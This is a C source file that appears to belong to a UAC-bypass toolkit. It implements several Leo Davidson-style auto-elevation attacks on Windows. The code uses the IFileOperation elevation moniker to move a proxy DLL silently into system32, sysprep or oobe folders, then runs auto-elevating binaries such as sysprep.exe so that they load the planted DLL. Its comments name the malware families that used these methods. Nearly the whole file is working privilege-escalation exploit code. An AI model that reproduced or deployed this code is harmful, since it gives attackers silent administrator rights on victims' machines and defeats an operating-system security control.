/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2016
*
*  TITLE:       PITOU.C
*
*  VERSION:     2.10
*
*  DATE:        16 Apr 2016
*
*  Leo Davidson based IFileOperation auto-elevation.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"
#include <shlobj.h>

/*
* ucmMasqueradedCopyFileCOM
*
* Purpose:
*
* Copy file autoelevated.
*
*/
BOOL ucmMasqueradedCopyFileCOM(
    LPWSTR SourceFileName,
    LPWSTR DestinationDir
    )
{
    BOOL                cond = FALSE;
    IFileOperation     *FileOperation1 = NULL;
    IShellItem         *isrc = NULL, *idst = NULL;
    BIND_OPTS3          bop;
    SHELLEXECUTEINFOW   shexec;
    HRESULT             r = E_FAIL;

    do {

        if ((SourceFileName == NULL) || (DestinationDir == NULL))
            break;

        RtlSecureZeroMemory(&bop, sizeof(bop));
        RtlSecureZeroMemory(&shexec, sizeof(shexec));

        r = CoCreateInstance(&CLSID_FileOperation, NULL,
            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);

        if (r != S_OK) {
            break;
        }

        if (FileOperation1 != NULL) {
            FileOperation1->lpVtbl->Release(FileOperation1);
        }

        bop.cbStruct = sizeof(bop);
        bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER;

        r = CoGetObject(IFILEOP_ELEMONIKER, (BIND_OPTS *)&bop, &IID_IFileOperation, &FileOperation1);
        if (r != S_OK) {
            break;
        }
        if (FileOperation1 == NULL) {
            r = E_FAIL;
            break;
        }

        FileOperation1->lpVtbl->SetOperationFlags(FileOperation1,
            FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);

        r = SHCreateItemFromParsingName(SourceFileName, NULL, &IID_IShellItem, &isrc);
        if (r != S_OK) {
            break;
        }

        r = SHCreateItemFromParsingName(DestinationDir, NULL, &IID_IShellItem, &idst);
        if (r != S_OK) {
            break;
        }

        r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
        if (r != S_OK) {
            break;
        }
        r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
        if (r != S_OK) {
            break;
        }

        idst->lpVtbl->Release(idst);
        idst = NULL;
        isrc->lpVtbl->Release(isrc);
        isrc = NULL;

    } while (cond);

    if (FileOperation1 != NULL) {
        FileOperation1->lpVtbl->Release(FileOperation1);
    }
    if (isrc != NULL) {
        isrc->lpVtbl->Release(isrc);
    }
    if (idst != NULL) {
        idst->lpVtbl->Release(idst);
    }

    return (SUCCEEDED(r));
}

/*
* ucmStandardAutoElevation2
*
* Purpose:
*
* Bypass UAC by abusing appinfo g_lpAutoApproveEXEList
*
* UAC contain whitelist of trusted fusion processes with only names and no other special restrictions
* Most of them unknown shit and list does not properly handled by system itself, use this fact.
*
*/
BOOL ucmStandardAutoElevation2(
    CONST PVOID ProxyDll,
    DWORD ProxyDllSize
    )
{
    BOOL  cond = FALSE, bResult = FALSE;
    WCHAR SourceFilePathAndName[MAX_PATH + 1];
    WCHAR DestinationFilePathAndName[MAX_PATH + 1];

    do {

        //source filename of dll
        RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
        _strcpy(SourceFilePathAndName, g_ctx.szTempDirectory);
        _strcat(SourceFilePathAndName, UNBCL_DLL);

        if (!supWriteBufferToFile(SourceFilePathAndName, ProxyDll, ProxyDllSize)) {
            break;
        }

        //copy %temp\unbcl.dll -> system32\unbcl.dll
        if (!ucmMasqueradedCopyFileCOM(SourceFilePathAndName, g_ctx.szSystemDirectory)) {
            break;
        }

        //source filename of process
        RtlSecureZeroMemory(SourceFilePathAndName, sizeof(SourceFilePathAndName));
        _strcpy(SourceFilePathAndName, g_ctx.szSystemDirectory);
        _strcat(SourceFilePathAndName, SYSPREP_EXE);

        RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
        _strcpy(DestinationFilePathAndName, g_ctx.szTempDirectory);
        _strcat(DestinationFilePathAndName, OOBE_EXE);

        //system32\sysprep\sysprep.exe -> temp\oobe.exe
        if (!CopyFile(SourceFilePathAndName, DestinationFilePathAndName, FALSE)) {
            break;
        }

        //temp\oobe.exe -> system32\oobe.exe
        if (!ucmMasqueradedCopyFileCOM(DestinationFilePathAndName, g_ctx.szSystemDirectory)) {
            break;
        }

        RtlSecureZeroMemory(DestinationFilePathAndName, sizeof(DestinationFilePathAndName));
        _strcpy(DestinationFilePathAndName, g_ctx.szSystemDirectory);
        _strcat(DestinationFilePathAndName, OOBE_EXE);

        bResult = supRunProcess(DestinationFilePathAndName, NULL);

    } while (cond);

    return bResult;
}


/*
* ucmStandardAutoElevation
*
* Purpose:
*
* Leo Davidson AutoElevation method with derivatives.
*
* UacMethodSysprep1   - Original Leo Davidson concept.
* UacMethodSysprep2   - Windows 8.1 adapted M1W7 (bypassing sysprep embedded manifest dlls redirection).
* UacMethodTilon      - Leo Davidson concept with different target dll, used by Win32/Tilon.
* UacMethodSysprep3   - Windows 10 TH1 adapted M1W7.
* UacMethodOobe       - WinNT/Pitou derivative from Leo Davidson concept.
*
*/
BOOL ucmStandardAutoElevation(
    UACBYPASSMETHOD Method,
    CONST PVOID ProxyDll,
    DWORD ProxyDllSize
    )
{
    BOOL	cond = FALSE, bResult = FALSE;
    WCHAR   szSourceDll[MAX_PATH * 2];
    WCHAR   szTargetDir[MAX_PATH * 2];
    WCHAR   szTargetProcess[MAX_PATH * 2];


    _strcpy(szSourceDll, g_ctx.szTempDirectory);
    _strcpy(szTargetDir, g_ctx.szSystemDirectory);
    _strcpy(szTargetProcess, g_ctx.szSystemDirectory);

    switch (Method) {

    case UacMethodSysprep1:

        //%temp%\cryptbase.dll
        _strcat(szSourceDll, CRYPTBASE_DLL);

        //%systemroot%\system32\sysprep      
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe       
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    case UacMethodSysprep2:

        //%temp\\shcore.dll
        _strcat(szSourceDll, SHCORE_DLL);

        //%systemroot%\system32\sysprep
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    case UacMethodSysprep3:

        //%temp%\dbgcore.dll
        _strcat(szSourceDll, DBGCORE_DLL);

        //%systemroot%\system32\sysprep
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    case UacMethodOobe:

        //%temp%\wdscore.dll
        _strcat(szSourceDll, WDSCORE_DLL);

        //%systemroot%\system32\oobe\"
        _strcat(szTargetDir, L"oobe\\");

        //%systemroot%\system32\oobe\setupsqm.exe
        _strcat(szTargetProcess, SETUPSQM_EXE);

        break;

    case UacMethodTilon:

        //%temp%\ActionQueue.dll
        _strcat(szSourceDll, ACTIONQUEUE_DLL);

        //%systemroot%\system32\sysprep
        _strcat(szTargetDir, SYSPREP_DIR);

        //%systemroot%\system32\sysprep\sysprep.exe
        _strcat(szTargetProcess, SYSPREP_EXE);

        break;

    default:
        return FALSE;
    }

    do {

        if (!supWriteBufferToFile(szSourceDll, ProxyDll, ProxyDllSize)) {
            OutputDebugString(L"[UCM] Error extracting payload dll");
            break;
        }

        if (!ucmMasqueradedCopyFileCOM(szSourceDll, szTargetDir)) {
            OutputDebugString(L"[UCM] Failed copy file to the protected directory");
            break;
        }

        bResult = supRunProcess(szTargetProcess, NULL);

    } while (cond);

    return bResult;
}
